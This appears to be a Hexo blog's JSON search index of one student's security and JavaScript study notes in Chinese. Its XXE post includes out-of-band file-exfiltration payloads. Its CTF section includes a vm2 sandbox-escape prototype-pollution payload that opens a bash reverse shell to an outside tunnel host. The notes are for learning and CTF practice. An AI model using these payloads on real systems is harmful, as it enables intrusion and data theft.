{"meta":{"title":"arkcimi's Blog","subtitle":"","description":"","author":"arkcimi","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"xxe","slug":"xxe","date":"2024-05-21T01:48:16.000Z","updated":"2024-05-21T01:49:53.018Z","comments":true,"path":"xxe/","link":"","permalink":"http://example.com/xxe/","excerpt":"","text":"源码 XML12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt; &lt;name&gt;XiaoMing&lt;/name&gt; &lt;age&gt;18&lt;/age&gt;&lt;/person&gt; DTDdtd 写在 xml里面123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE person [ &lt;!ELEMENT person (name, age)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT age (#PCDATA)&gt;]&gt;&lt;person&gt; &lt;name&gt;XiaoMing&lt;/name&gt; &lt;age&gt;18&lt;/age&gt;&lt;/person&gt; 外部引用12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE person SYSTEM &quot;test.dtd&quot;&gt;&lt;person&gt; &lt;name&gt;XiaoMing&lt;/name&gt; &lt;age&gt;18&lt;/age&gt;&lt;/person&gt; test.dtd 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE person [ &lt;!ELEMENT person (name, age)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT age (#PCDATA)&gt;]&gt; ENTITY12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY nn &quot;XiaoMing&quot;&gt;]&gt;&lt;person&gt; &lt;name&gt;&amp;nn;&lt;/name&gt; &lt;age&gt;18&lt;/age&gt;&lt;/person&gt; SYSTEM(读取文件&#x2F;url&#x2F;伪协议) 12345678910&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY nn SYSTEM &quot;file:///etc/pqsswd&quot;&gt;]&gt;&lt;person&gt; &lt;name&gt;&amp;nn;&lt;/name&gt; &lt;age&gt;18&lt;/age&gt;&lt;/person&gt; ENTITY %test.dtd 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY % nn &quot;XiaoMing&quot;&gt; %nn;]&gt; 一些奇奇怪怪的利用方式递归123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY file &quot;AA&quot;&gt; &lt;!ENTITY file2 &quot;&amp;file;&amp;file;&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;file2;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt; 1AAAA 替换12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY % load SYSTEM &quot;http://xxx/a.dtd&quot;&gt; %load;]&gt; 这时候，在 a.dtd 中 12&lt;!ENTITY % send SYSTEM &quot;http://xxx/arg&quot;&gt;%send; 那么，原来的xml会被替换成 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY % load SYSTEM &quot;http://xxx/a.dtd&quot;&gt; &lt;!ENTITY % send SYSTEM &quot;http://xxx/arg&quot;&gt; %send;]&gt; 如此就能造成文件读取123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/mnt/d/flag.txt&quot;&gt; &lt;!ENTITY % load SYSTEM &quot;http://xxx/a.dtd&quot;&gt; %load;]&gt; a.dtd 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx/%file;&#x27;&gt;&quot;&gt;%start; (中间的%要转译，hex，后面的不知道为啥不用) (读的文件不要太大，我读了&#x2F;etc&#x2F;passwd一直报错。。) exec在PHP中安装expect模块后，就支持使用expect:&#x2F;&#x2F;协议来执行系统命令","categories":[],"tags":[],"author":"arkcimi"},{"title":"hash","slug":"hash","date":"2024-05-21T01:47:52.000Z","updated":"2024-05-21T01:49:37.275Z","comments":true,"path":"hash/","link":"","permalink":"http://example.com/hash/","excerpt":"","text":"hash算法512 bit&#x2F;64B 为一块 最后一块 小于 56B 时, 填充 padding (1000 0000 0000 …)到 56B , 后面 8B 表示 padding 长度 最后一块 大于 56B 时, 后面加一块，填充 padding (1000 0000 0000 …)到下一块的 56B , 后面 8B 表示 padding 长度 (bky)[https://www.cnblogs.com/yunen/p/13624595.html] 哈希算法的运行过程对于MD5算法来说，有一串初始向量如下： 1234A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476 这串初始向量的值是固定的，作为与第一块数据运算的原始向量 123初始向量 经&#123;第1块&#125; 得到向量2向量2 经&#123;第2块&#125; 得到向量3... 最后得到的向量重排一下得到md5值 如向量串： 1234A=0xab45bc01B=0x6a64bb53C=0x23ba8afeD=0x46847a62 先两两为一组进行组合，得到如下数据： 1234ab 45 bc 016a 64 bb 5323 ba 8a fe46 84 7a 62 再进行高低位互换，得到如下数据： 123401 bc 45 ab53 bb 64 6afe 8a ba 2362 7a 84 46 最终拼接得到MD5值： 101bc45ab53bb646afe8aba23627a8446 攻击所以， 在我们得到一个字符串的md5值时，我们就得到了最后的向量 我们在末尾加到 64位， 再加上一个可控的字符串 用刚才的向量 经这个字符串，那么结果也就可控","categories":[],"tags":[],"author":"arkcimi"},{"title":"JAVAunserialize","slug":"JAVAunserialize","date":"2024-05-21T01:46:48.000Z","updated":"2024-05-21T01:46:48.372Z","comments":true,"path":"JAVAunserialize/","link":"","permalink":"http://example.com/JAVAunserialize/","excerpt":"","text":"","categories":[],"tags":[],"author":"arkcimi"},{"title":"make","slug":"make","date":"2024-04-13T03:07:52.000Z","updated":"2024-04-29T03:22:49.062Z","comments":true,"path":"make/","link":"","permalink":"http://example.com/make/","excerpt":"","text":"123456789101112131415161718192021222324252627282930┌──(root㉿Daniel)-[~/mess/maketest]└─# vim Makefile┌──(root㉿Daniel)-[~/mess/maketest]└─# makegcc -c ./test.c -o ./test.ogcc ./test.o -o hello.out┌──(root㉿Daniel)-[~/mess/maketest]└─# lshello.out Makefile test.c test.o┌──(root㉿Daniel)-[~/mess/maketest]└─# ./hello.outhelloworld┌──(root㉿Daniel)-[~/mess/maketest]└─# vim test.c┌──(root㉿Daniel)-[~/mess/maketest]└─# ./hello.outhelloworld┌──(root㉿Daniel)-[~/mess/maketest]└─# makegcc -c ./test.c -o ./test.ogcc ./test.o -o hello.out┌──(root㉿Daniel)-[~/mess/maketest]└─# ./hello.outhelloworldADD NEW 爬了一些下来 自动变量（Automatic Variables） $@ $@指代当前目标，就是Make命令当前构建的那个目标。比如，make foo的 $@ 就指代foo。 12a.txt b.txt: touch \\$@ 等同于下面的写法。 1234a.txt: touch a.txtb.txt: touch b.txt $&lt; $&lt; 指代第一个前置条件。比如，规则为 t: p1 p2，那么$&lt; 就指代p1。 $? $? 指代比目标更新的所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，其中 p2 的时间戳比 t 新，$?就指代p2。 $^ $^ 指代所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，那么 $^ 就指代 p1 p2 。 $* $* 指代匹配符 % 匹配的部分， 比如% 匹配 f1.txt 中的f1 ，$* 就表示 f1。 $(@D) 和 $(@F) $(@D) 和 $(@F) 分别指向 $@ 的目录名和文件名。比如，$@是 src&#x2F;input.c，那么$(@D) 的值为 src ，$(@F) 的值为 input.c。 $(&lt;D) 和 $(&lt;F) $(&lt;D) 和 $(&lt;F) 分别指向 $&lt; 的目录名和文件名","categories":[],"tags":[],"author":"arkcimi"},{"title":"websocket","slug":"websocket","date":"2024-04-09T10:19:36.000Z","updated":"2024-04-09T08:36:37.079Z","comments":true,"path":"websocket/","link":"","permalink":"http://example.com/websocket/","excerpt":"","text":"websocketWebsocket是一个持久化的协议，不同于http只能一个request对应一个response websocket约定了一个通信的规范，通过一个握手的机制，可以多次请求与回复 不知道怎么开始学，让ai生成一个来看看 简易聊天室index.html 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;WebSocket Chat&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt; &lt;!-- css---&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;chat-window&quot;&gt; &lt;div id=&quot;chat-output&quot;&gt;&lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;user-id&quot; placeholder=&quot;id&quot;&gt; &lt;input type=&quot;text&quot; id=&quot;user-input&quot; placeholder=&quot;Type your message...&quot;&gt; &lt;button id=&quot;send-btn&quot;&gt;Send&lt;/button&gt; &lt;/div&gt; &lt;!-- 输入处---&gt; &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt; &lt;!-- js ---&gt;&lt;/body&gt;&lt;/html&gt; script.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849document.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; const chatOutput = document.getElementById(&#x27;chat-output&#x27;); const userInput = document.getElementById(&#x27;user-input&#x27;); const userId = document.getElementById(&#x27;user-id&#x27;); const sendBtn = document.getElementById(&#x27;send-btn&#x27;); // 创建 WebSocket 连接 const socket = new WebSocket(&#x27;ws://127.0.0.1:1050&#x27;); // 当连接打开时执行 socket.onopen = (event) =&gt; &#123; console.log(&#x27;WebSocket connected&#x27;); &#125;; // 当接收到消息时执行 socket.onmessage = (event) =&gt; &#123; const inn = event; displayMessage(inn); &#125;; // 当连接关闭时执行 socket.onclose = (event) =&gt; &#123; console.log(&#x27;WebSocket closed&#x27;); &#125;; // 发送消息 sendBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; const message = userInput.value; const id = userId.value; if (message.trim() !== &#x27;&#x27; &amp;&amp; id.trim() !== &#x27;&#x27;) &#123; out = `&#123;&quot;message&quot;:&quot;$&#123;message&#125;&quot;, &quot;id&quot;:&quot;$&#123;id&#125;&quot;&#125;`; socket.send(out); userInput.value = &#x27;&#x27;; &#125; &#125;); // 显示消息在聊天窗口 function displayMessage(inms) &#123; const p = document.createElement(&#x27;p&#x27;); let msg = null; msg = JSON.parse(inms.data); console.log(msg); p.textContent = `$&#123;msg.id&#125; : $&#123;msg.message&#125;`; p.className = &#x27;ptext&#x27;; chatOutput.appendChild(p); chatOutput.scrollTop = chatOutput.scrollHeight; &#125;&#125;); server.js 123456789101112131415161718192021const WebSocket = require(&#x27;ws&#x27;);const wss = new WebSocket.Server(&#123; port: 1050 &#125;);wss.on(&#x27;connection&#x27;, function connection(ws) &#123; console.log(&#x27;Client connected&#x27;); ws.on(&#x27;message&#x27;, function incoming(in_msg) &#123; console.log(&#x27;Received: %s&#x27;, in_msg.toString(&#x27;utf8&#x27;)); // 将收到的消息广播给所有连接的客户端 wss.clients.forEach(function each(client) &#123; if (client.readyState === WebSocket.OPEN) &#123; client.send(in_msg.toString(&#x27;utf8&#x27;)); console.log(&quot;Sended&quot;); &#125; &#125;); &#125;); ws.on(&#x27;close&#x27;, function close() &#123; console.log(&#x27;Client disconnected&#x27;); &#125;);&#125;); 客户端需要 index.html, styles.css, script.js 服务端 npm下载ws, 运行 server.js functionaddEventListener12Button.addEventListener(&#x27;EventName&#x27;, EventFunction);//在 EventName 时运行后面的函数 element12345678const chatOutput = document.getElementById(&#x27;chat-output&#x27;);const userInput = document.getElementById(&#x27;user-input&#x27;);const userId = document.getElementById(&#x27;user-id&#x27;);const sendBtn = document.getElementById(&#x27;send-btn&#x27;);const p = document.createElement(&#x27;p&#x27;);p.className = &#x27;ptext&#x27;;chatOutput.appendChild(p); message&#x2F;eventwebsocket的信息内容一开始让我很迷惑(好像是二进制流 buffer) 目前自己用的方式是都转成json格式 123456send(`&#123;&quot;name&quot;:&quot;value&quot;,&quot;name&quot;:&quot;value&quot;&#125;`) //记得大括号=&gt; receive(message)&#123; let a = [JSON.parse(message.data) OR JSON.parse(message.toString(&#x27;utf8&#x27;))]; console.log(a.name);&#125; a 就能当一个类来用了 setInteval1var timer = setInterval(function, timegap); 每 timegap ms运行一次function 1234567891011let i = 0timer = setInterval(() =&gt; &#123; console.log(timer); i++; if(i &gt; 5) &#123; clearInterval(timer); //停止循环 console.log(timer); &#125;&#125;, 1000); var&#x2F;let12var //全局变量let //大括号内 Math123Math.random() //生成0~1的随机数Math.floor((Math.random() * a) + b) //a~b 俄罗斯方块思路是客户端发送 12&#123;&quot;id&quot;:&quot;#XXXXXX&quot;, &quot;direc&quot;:&quot;Initialize&quot;&#125;;&#123;&quot;id&quot;:&quot;#XXXXXX&quot;, &quot;direc&quot;:&quot;Direction&quot;&#125;; 服务端发送 12&#123;&quot;state&quot;:&quot;0&quot;,&quot;all&quot;:&quot;#XXXXXX#XXXXXX#XXXXXX#XXXXXX&quot;&#125; //4个玩家的颜色&#123;&quot;state&quot;:&quot;1&quot;,&quot;all&quot;:&quot;000...40*16&quot;&#125; //当前游戏的状态 0是空白 1234分别表示对应玩家的方块 script.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768var cookie = document.cookie;if(cookie.trim() == &#x27;&#x27;)&#123; const idse = [&#x27;#&#x27;, Number(Math.floor((Math.random() * 62) + 123)).toString(16).toUpperCase(), Number(Math.floor((Math.random() * 62) + 123)).toString(16).toUpperCase(), Number(Math.floor((Math.random() * 62) + 123)).toString(16).toUpperCase()]; document.cookie = `ssa=$&#123;idse.join(&#x27;&#x27;)&#125;`; //#XXXXXX cookie = document.cookie; console.log(`set cookie : $&#123;cookie&#125;`);&#125;//random 6 hexvar color_ID = [&quot;#FF0000&quot;, &quot;#00FF00&quot;, &quot;#0000FF&quot;, &quot;#FFFFFF&quot;]// 创建 WebSocket 连接const socket = new WebSocket(&#x27;ws://127.0.0.1:1050&#x27;);const DivBoard = document.getElementById(&#x27;board&#x27;);document.addEventListener(&#x27;DOMContentLoaded&#x27;, () =&gt; &#123; // 当连接打开时执行 socket.onopen = (event) =&gt; &#123; console.log(&#x27;WebSocket connected&#x27;); initialize(); &#125;; // 当接收到消息时执行 socket.onmessage = (event) =&gt; &#123; var js_in = JSON.parse(event.data); var arr_in = new Array(); for (let index = 0; index &lt; js_in.all.length; index++) &#123; arr_in.push(Number(js_in.all[index])); &#125; console.log(arr_in); displayWindow(arr_in); &#125;; // 当连接关闭时执行 socket.onclose = (event) =&gt; &#123; console.log(&#x27;WebSocket closed&#x27;); &#125;;&#125;);document.addEventListener(&#x27;keydown&#x27;, (event) =&gt;&#123; console.log(event.key); socket.send(`&#123;&quot;id&quot;:&quot;$&#123;cookie&#125;&quot;, &quot;direc&quot;:&quot;$&#123;event.key&#125;&quot;&#125;`);&#125;);function initialize() &#123; socket.send(`&#123;&quot;id&quot;:&quot;$&#123;cookie&#125;&quot;, &quot;direc&quot;:&quot;Initialize&quot;&#125;`);&#125;//得到一个二维数组 [[0,0...*40],[0,0...*40]...*16]function displayWindow(arrayAll) &#123; let i = 0; while (DivBoard.hasChildNodes()) &#123; DivBoard.removeChild(DivBoard.firstChild); &#125; arrayAll.forEach(element =&gt; &#123; if(element &gt; 0) &#123; const div = document.createElement(&#x27;div&#x27;); div.className = &#x27;block&#x27;; div.style.setProperty(&#x27;--idcolor&#x27;, color_ID[element-1]); div.style.setProperty(&#x27;--x&#x27;, `$&#123;i%40 * 20 + DivBoard.getBoundingClientRect().left + 20&#125;px`); div.style.setProperty(&#x27;--y&#x27;, `$&#123;Math.floor(i/40) * 20 + DivBoard.getBoundingClientRect().top + 20&#125;px`); DivBoard.appendChild(div); &#125; i++; &#125;); i = 0;&#125; server.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const WebSocket = require(&#x27;ws&#x27;);const wss = new WebSocket.Server(&#123; port: 1050 &#125;);var color_ID = [&quot;#FFFFFF&quot;];var id_count = 0;var state = 0;//state == 1//play board[y][x]var play_board = [[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]] //40*16//drop block[id-1][num]var drop_block = [[1,2,3,4],[46,56,64,44],[74,76,71,75],[62,63,68,69]];var block_template = [[0,40,80,120],[0,40,41,81],[1,41,40,80],[1,40,41,81],[0,1,41,81],[1,41,80,81],[0,1,40,41]]; //7种类型wss.on(&#x27;connection&#x27;, function connection(ws) &#123; console.log(&#x27;Client connected&#x27;); ws.on(&#x27;message&#x27;, function incoming(inmsg) &#123; let intext = null; let array_run = null; intext = JSON.parse(inmsg.toString(&#x27;utf8&#x27;)); console.log(intext); array_run = run(intext.id, intext.direc); // 将收到的消息广播给所有连接的客户端 wss.clients.forEach(function each(client) &#123; if (client.readyState === WebSocket.OPEN) &#123; client.send(`&#123;&quot;state&quot;:&quot;$&#123;state&#125;&quot;,&quot;all&quot;:&quot;$&#123;array_run&#125;&quot;&#125;`); console.log(&quot;Sended&quot;); &#125; &#125;); &#125;); ws.on(&#x27;close&#x27;, function close() &#123; console.log(&#x27;Client disconnected&#x27;); &#125;);&#125;);//合并数组为一个字符串function run(id, dir) &#123; draw_drop_block(); let array_out = play_board.map((item) =&gt; &#123; return item.join(&#x27;&#x27;); &#125;).join(&#x27;&#x27;); clear_drop_block(); return array_out;&#125;function draw_drop_block() &#123; for(let i = 0; i &lt; drop_block.length; i++) &#123; drop_block[i].forEach((e) =&gt; &#123; play_board[Math.floor(e/40)][e%40] = i; &#125;); &#125;&#125;function clear_drop_block() &#123; for(let i = 0; i &lt; drop_block.length; i++) &#123; drop_block[i].forEach((e) =&gt; &#123; play_board[Math.floor(e/40)][e%40] = 0; &#125;); &#125;&#125;","categories":[{"name":"Internet","slug":"Internet","permalink":"http://example.com/categories/Internet/"}],"tags":[{"name":"socket","slug":"socket","permalink":"http://example.com/tags/socket/"},{"name":"js","slug":"js","permalink":"http://example.com/tags/js/"},{"name":"game","slug":"game","permalink":"http://example.com/tags/game/"}],"author":"arkcimi"},{"title":"js","slug":"js","date":"2024-03-25T08:18:22.000Z","updated":"2024-04-13T12:01:23.498Z","comments":true,"path":"js/","link":"","permalink":"http://example.com/js/","excerpt":"","text":"js 基础&#x3D;&gt; function123456789var fun = function(a)&#123; return 2*a;&#125;let a = [1,2,3,4,5,6];console.log(a);let b = a.map(fun);console.log(b); 12[ 1, 2, 3, 4, 5, 6 ][ 2, 4, 6, 8, 10, 12 ] 用箭头函数简化 12345let a = [1,2,3,4,5,6];console.log(a);let b = a.map(a =&gt; 2*a);console.log(b); 12345678a = [&quot;zfxc&quot;, &quot;1231&quot;, 121, &#123;&quot;name&quot; : &quot;zdf&quot;&#125;];console.log(a.filter(f =&gt; typeof f !== &quot;number&quot;) .filter(f =&gt; typeof f === &#x27;object&#x27;));#&gt; node test.js[ &#123; name: &#x27;zdf&#x27; &#125; ] 1234567891011121314151617181920212223242526// 例子1 数组for(let item of a)&#123; console.log(item); // 1,2,3&#125; // 例子2 数组含对象for(let item of b)&#123; console.log(item); // &#123;a:1&#125;,&#123;b:2&#125;,&#123;c:3&#125;&#125;// 例子3 数组含对象 遍历出valuefor(let item of b.values() )&#123; console.log(item); // &#123;a:1&#125;,&#123;b:2&#125;,&#123;c:3&#125;&#125;// 例子4 数组含对象 遍历出keyfor(let index of b.keys() )&#123; console.log(index); // 0,1,2&#125;// 例子5 数组含对象 遍历出value和indexfor(let [item, index] of b.entries() )&#123; console.log(item); // &#123;a:1&#125;,&#123;b:2&#125;,&#123;c:3&#125; console.log(index); // 0,1,2&#125; 12JavaScript 能够精确表示的极限。Number.isSafeInteger()则是用来判断一个整数是否落在这个范围之内 nodemodule require &#x2F; exports11234const multiply = (a, b) =&gt; &#123; return a * b;&#125;;module.exports = multiply; //function name 12const my_multiply = require(&#x27;./utils&#x27;);console.log(my_multiply(3, 4)); s123456789101112function add(a, b) &#123; return a + b;&#125;function multiply(a, b) &#123; return a * b;&#125;module.exports = &#123; add, multiply&#125;; 123const math = require(&#x27;./utils&#x27;);console.log(math.add(3,4));console.log(math.multiply(3,4)); compose打开项目位置 12npm initnpm install express get&#x2F;post123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const express = require(&#x27;express&#x27;);const fs = require(&#x27;fs&#x27;)const app = express();// //中间件// const logMiddleware = (req, res, next) =&gt;&#123;// const &#123;method, url, ip&#125; = req; //req.method// const currentTime = new Date().toISOString();// const logEntry = `$&#123;currentTime&#125; - $&#123;ip&#125; - $&#123;method&#125;$&#123;url&#125;\\n`;// fs.appendFile(&#x27;logs.txt&#x27;, logEntry, (err) =&gt; &#123;// if(err)&#123;// console.error(&quot;Failed to log, err:&quot;, err);// &#125;// &#125;);// next();// &#125;app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.set(&#x27;views&#x27;, &#x27;./view&#x27;);app.use((req, res, next) =&gt; &#123; console.log(`[$&#123;new Date().toISOString()&#125;] $&#123;req.method&#125; $&#123;req.url&#125;`); next();&#125;);app.use(express.urlencoded(&#123;extended: false&#125;));app.use((err, req, res, next) =&gt; &#123; console.error(err.stack); res.status(500).send(`Internet server error`);&#125;);app.get(&#x27;/&#x27;, (req, res) =&gt; &#123; const products = [&#x27;Apple&#x27;, &#x27;Banana&#x27;, &#x27;Orange&#x27;]; res.render(&#x27;index&#x27;, &#123;title: products&#125;);&#125;);app.get(&#x27;/get&#x27;, (req, res) =&gt; &#123; const que = req.query.id; res.send(`Email : $&#123;que&#125;`);&#125;);app.get(&#x27;/get/:id&#x27;, (req, res) =&gt; &#123; const userId = req.params.id; res.send(`User ID : $&#123;userId&#125;`);&#125;);app.post(&#x27;/post&#x27;, (req, res) =&gt; &#123; const &#123;name, email&#125; = req.body; res.status(201).json(&#123;message: `User($&#123;name&#125;) created successfully, add`&#125;); console.log(req.body);&#125;);app.listen(3000, () =&gt; &#123; console.log(&#x27;Server is running on port 3000&#x27;);&#125;); protolist12345678910111213141516171819var Person = function(age)&#123; this.age = age;&#125;var per1 = new Person(11);console.log(Person);// ƒ (age)&#123;// this.age = age;// &#125;consloe.log(per1)// Person &#123;age: 11&#125;// age: 11// [[Prototype]]: Objectconsole.log(typeof(per1));// object example[HZNUCTF 2023 final]eznode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const express = require(&#x27;express&#x27;);const app = express();const &#123; VM &#125; = require(&#x27;vm2&#x27;);app.use(express.json());const backdoor = function () &#123; try &#123; new VM().run(&#123;&#125;.shellcode); &#125; catch (e) &#123; console.log(e); &#125;&#125;const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;app.get(&#x27;/&#x27;, function (req, res) &#123; res.send(&quot;POST some json shit to /. no source code and try to find source code&quot;);&#125;);app.post(&#x27;/&#x27;, function (req, res) &#123; try &#123; console.log(req.body) var body = JSON.parse(JSON.stringify(req.body)); var copybody = clone(body) if (copybody.shit) &#123; backdoor() &#125; res.send(&quot;post shit ok&quot;) &#125;catch(e)&#123; res.send(&quot;is it shit ?&quot;) console.log(e) &#125;&#125;)app.listen(3000, function () &#123; console.log(&#x27;start listening on port 3000&#x27;);&#125;); [HZNUCTF 2023 final]eznode 1&#123;&quot;shit&quot;:1,&quot;__proto__&quot;:&#123;&quot;shellcode&quot;:&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\\&quot;return this\\&quot;) ().process.mainModule.require(\\&quot;child_process\\&quot;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/20.tcp.cpolar.top/11659 0&gt;&amp;1\\&quot;&#x27;).toString();&quot;&#125;&#125; vm沙箱逃逸 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const express = require(&#x27;express&#x27;)var hbs = require(&#x27;hbs&#x27;);var bodyParser = require(&#x27;body-parser&#x27;);const md5 = require(&#x27;md5&#x27;);var morganBody = require(&#x27;morgan-body&#x27;);const app = express();var user = []; //empty for now 空数组 祖先是object,只要污染object即可完成原型链污染：在object加入admintoken即可拿到useradmintoken var matrix = [];for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null];&#125; function draw(mat) &#123; var count = 0; for (var i = 0; i &lt; 3; i++)&#123; for (var j = 0; j &lt; 3; j++)&#123; if (matrix[i][j] !== null)&#123; count += 1; &#125; &#125; &#125; return count === 9;&#125; app.use(express.static(&#x27;public&#x27;));app.use(bodyParser.json());app.set(&#x27;view engine&#x27;, &#x27;html&#x27;);morganBody(app);app.engine(&#x27;html&#x27;, require(&#x27;hbs&#x27;).__express); app.get(&#x27;/&#x27;, (req, res) =&gt; &#123; for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null]; &#125; res.render(&#x27;index&#x27;);&#125;) app.get(&#x27;/admin&#x27;, (req, res) =&gt; &#123; /*this is under development I guess ??*/ console.log(user.admintoken); if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123; res.send(&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;); &#125; else &#123; res.status(403).send(&#x27;Forbidden&#x27;); &#125; &#125;) app.post(&#x27;/api&#x27;, (req, res) =&gt; &#123; var client = req.body; var winner = null; if (client.row &gt; 3 || client.col &gt; 3)&#123; client.row %= 3; client.col %= 3; &#125; // 污染思路：+在request里传入 row :&quot;__proto__&quot;,&#x27;col&#x27; :&quot;admintoken&quot;对象 // 相当于matrix.__proto__admintoken = &#x27;xxxxx&#x27;此时，user可以找到admintoken // 关键 matrix[client.row][client.col] = client.data; // client可以控制，client.data可控制 client.row和client.col也可以控制 for(var i = 0; i &lt; 3; i++)&#123; if (matrix[i][0] === matrix[i][1] &amp;&amp; matrix[i][1] === matrix[i][2] )&#123; if (matrix[i][0] === &#x27;X&#x27;) &#123; winner = 1; &#125; else if(matrix[i][0] === &#x27;O&#x27;) &#123; winner = 2; &#125; &#125; if (matrix[0][i] === matrix[1][i] &amp;&amp; matrix[1][i] === matrix[2][i])&#123; if (matrix[0][i] === &#x27;X&#x27;) &#123; winner = 1; &#125; else if(matrix[0][i] === &#x27;O&#x27;) &#123; winner = 2; &#125; &#125; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === &#x27;X&#x27;)&#123; winner = 1; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === &#x27;O&#x27;)&#123; winner = 2; &#125; if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === &#x27;X&#x27;)&#123; winner = 1; &#125; if 